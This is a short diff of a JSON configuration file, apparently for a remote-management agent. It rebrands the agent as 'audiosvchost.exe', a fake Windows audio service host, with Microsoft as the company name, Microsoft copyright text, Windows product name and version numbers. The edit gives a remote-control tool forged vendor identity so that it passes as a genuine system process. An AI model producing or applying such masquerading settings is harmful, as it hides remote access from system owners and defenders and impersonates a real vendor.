@@ -79,23 +79,24 @@
       ],
       "agentSelfGuestSharing": true,
       "agentCustomization": {
-        "displayName": "Service Host: Local Service (Network Restricted))",
-        "description": "Host Process for Windows",
+        "displayName": "Service Host: Local Service (Network Restricted)",
+        "description": "Host process for Windows audio services.",
         "companyName": "Microsoft\u00ae",
-        "serviceName": "Windows Audio",
-        "installText": "",
-        "fileName": "svchost",
+        "serviceName": "AudioSvcHost",
+        "installText": "Host process for Windows audio services.",
+        "fileName": "audiosvchost",
         "foregroundColor": "#ffffff",
         "backgroundColor": "#1b4058"
       },
       "agentFileInfo": {
         "fileDescription": "Host Process for Windows Services",
-        "fileVersion": "1.0.0.0",
-        "internalName": "svchost",
+        "fileVersion": "10.0.0.0",
+        "internalName": "audiosvchost",
         "legalCopyright": "\u00a9 Microsoft Corporation. All rights reserved.",
-        "originalFilename": "svchost.exe",
+        "originalFilename": "audiosvchost.exe",
         "productName": "Microsoft\u00ae Windows\u00ae operating system",
-        "productVersion": "v1.0.0"
+        "productVersion": "10.0.0.0",
+        "icon": "service.ico"
       },
       "agentConfig": [],
       "agentInviteCodes": false,
